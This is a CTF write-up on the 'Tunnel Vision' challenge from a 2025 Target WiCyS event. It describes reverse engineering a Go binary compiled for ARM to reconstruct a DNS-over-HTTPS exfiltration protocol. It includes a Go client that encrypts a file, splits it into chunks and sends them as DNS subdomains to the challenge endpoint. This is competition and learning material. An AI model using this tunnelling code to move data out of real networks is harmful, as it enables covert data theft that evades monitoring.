# 💣 2025 Target WiCyS Challenge (Tier 2, O5: Tunnel Vision) – Writeup

**CTF Name:** 2025 Target Cyber Defense Challenge  
**Date:** August, 21 - September, 30  
**Total Challenges:** 11  
**Completed:** 11/11  
**Points:** 2900/2900   
**Place:** 3rd   
**Participants:** 50  

> **Point System:**
🟢 200 points – Easy
🟡 300 points – Medium
🔴 500 points – Hard

This challenge simulates a cyberattack against a tech company, where participants play both defender (Tier 1) and threat actor (Tier 2) roles. The challenge focuses on incident response, threat detection, and threat intelligence.

While I managed to clear the board, one challenge in particular felt like the "final boss": O5: Tunnel Vision.

This wasn't just a "find the flag" task; it was a full-scale reverse engineering project that required building a custom tool from scratch to communicate with a live, undocumented endpoint.

---

## O5. Tunnel Vision

**Category:** Reverse Engineering  
**Points:** 500 (Hard)  
**Description:**  
> _This challenge focuses on reverse engineering a legacy binary to reconstruct a custom DNS-based exfiltration protocol. With no documentation available, the goal is to analyze the provided server binary, understand the client–server communication flow, and replicate it._
> 
>_After identifying the correct handshake and message format, you must build a client that communicates with the live endpoint (target-exfil[.]chals[.]io) using the specified exfiltration domain (xfl[.]tn). The final step is to correctly upload the provided file through this protocol. If done successfully, the server responds with the flag._

**Tools Used:**  
- Ghidra: My primary disassembler and decompiler. I used it to map out the ARM assembly and analyze the logic of the `main` and `exfil` functions.
- Go (Golang): Chosen for the client implementation to match the server’s native logic and utilize the same cryptographic libraries.
- NaCl/Box & Blake3: Specific Go packages used to handle encryption and file integrity hashing required by the protocol.
- CyberChef: Used when manually decoding Base32 strings and verifying hex outputs.

**The Learning Curve**  
Coming into this as a newcomer to deep reverse engineering, the "Tunnel Vision" challenge was an immediate brick wall. The binary was written in Golang and compiled for ARM, which adds significant complexity due to Go's static linking and unique runtime.  
To make sense of the assembly, I leaned heavily on several key resources:  
- The Go Problem: I spent hours learning how to handle Go's symbols and types using [Cujo’s Guide to Reversing Go (Part 1)](https://cujo.com/blog/reverse-engineering-go-binaries-with-ghidra/) and [Part 2](https://cujo.com/blog/reverse-engineering-go-binaries-with-ghidra-part-2-type-extraction-windows-pe-files-and-golang-versions/). This [presentation by FIRST](https://www.youtube.com/watch?v=oeWSWD5avZo) was also instrumental in understanding the Go runtime.
- The Architecture: Since it was ARM-based, I went through [LaurieWired’s ARM Assembly lessons](https://www.youtube.com/watch?v=kKtWsuuJEDs&list=PLn_It163He32Ujm-l_czgEBhbJjOUgFhg) to understand how registers were being manipulated.
- The Tooling: I automated the heavy lifting in Ghidra using the [Advanced Threat Research GhidraScripts](https://github.com/advanced-threat-research/GhidraScripts).
- The Implementation: I used [W3Schools' Go Tutorial](https://www.w3schools.com/go/) to quickly bridge the gap between "reading code" and "writing a functional client."

**Protocol Analysis**  
Through Ghidra, I reconstructed the communication flow. The server expects DNS over HTTPS (DoH) style requests. The exfiltration follows a strict four-step dance:  
1. Handshake: The client sends a Base32-encoded public key. The server responds with AAAA records (IPv6 addresses) that actually contain the server's public key and a nonce.  
2. Shared Secret: Using `nacl/box`, a shared secret is generated for encrypted communication.  
3. Metadata (Chunk 0): Before the data starts, the server requires a metadata packet containing the file size, total chunks, and a [Blake3 hash](https://github.com/BLAKE3-team/BLAKE3) for integrity.  
4. Data Tunneling: The file is split into 124-byte chunks, encrypted, and sent as subdomains (e.g., `[encrypted_data].[seq].[session].xfl.tn`).  

**The AI Trap**  
I initially tried using AI to decompile the logic. The AI hallucinated the protocol details multiple times. I eventually had to ignore the AI drafts and manually map the decompiled code to the logic I was seeing in the ARM assembly.

**The Solution (Client Implementation)**  
After multiple iterations, I developed a Go client that handles the key exchange, builds the custom DNS queries, and parses the IPv6-encoded responses from the server:  

```Go
package main

import (
	"bytes"
	"crypto/rand"
	"encoding/base32"
	"encoding/binary"
	"flag"
	"fmt"
	"io"
	"log"
	"net/http"
	"os"
	"sort"
	"time"

	"github.com/miekg/dns"
	"golang.org/x/crypto/nacl/box"
	"lukechampine.com/blake3"
)

const (
	dohServerURL = "https://target-exfil.chals.io/dns-query?"
	chunkSize    = 124
	blockSize    = 56
)

var encoding = base32.NewEncoding("0123456789abcdefghijklmnopqrstuv").WithPadding(base32.NoPadding)

func main() {
	filePath := flag.String("file", "upload_file.bin", "Path to the file to exfiltrate")
	flag.Parse()

	// 1. Initialize Keys
	pub, priv, err := box.GenerateKey(rand.Reader)
	if err != nil {
		log.Fatalf("[-] Key generation failed: %v", err)
	}

	// 2. Protocol Handshake
	fmt.Println("[*] Starting handshake...")
	session, sharedKey, err := performHandshake(pub, priv)
	if err != nil {
		log.Fatalf("[-] Handshake failed: %v", err)
	}
	fmt.Printf("[+] Session established: %x\n", session)

	// 3. Prepare File Data
	content, err := os.ReadFile(*filePath)
	if err != nil {
		log.Fatalf("[-] Could not read file: %v", err)
	}

	fileLen := uint32(len(content))
	numChunks := uint32((len(content) + chunkSize - 1) / chunkSize)
	hash := blake3.Sum512(content)

	// 4. Send Metadata (Chunk 0)
	metaData := make([]byte, 40)
	binary.BigEndian.PutUint32(metaData[0:4], fileLen)
	binary.BigEndian.PutUint32(metaData[4:8], numChunks)
	copy(metaData[8:40], hash[:])

	fmt.Println("[*] Sending metadata (Chunk 0)...")
	sendEncryptedChunk(session, sharedKey, metaData, 0)

	// 5. Exfiltrate Data
	var finalResponse bytes.Buffer
	for i := uint32(0); i < numChunks; i++ {
		start := i * chunkSize
		end := start + chunkSize
		if end > fileLen {
			end = fileLen
		}

		fmt.Printf("\r[*] Progress: %d/%d chunks sent", i+1, numChunks)
		decryptedResp := sendEncryptedChunk(session, sharedKey, content[start:end], i+1)
		finalResponse.Write(decryptedResp)
	}

	fmt.Println("\n[+] Exfiltration complete.")
	os.WriteFile("result_bin.txt", finalResponse.Bytes(), 0644)
}
```

You can find the full source code for the client [here on my GitHub](https://github.com/AGruneva/ctf-writeups/blob/main/2025%20-%20Target%20WiCyS%20CTF/client.go).  

**Final Thoughts**  
This challenge was a massive jump in difficulty, but it perfectly illustrated how threat actors use legitimate protocols like DoH to hide their tracks. Reaching 3rd place in this CTF was a highlight of my year, and "Tunnel Vision" was the most rewarding solve of the event.
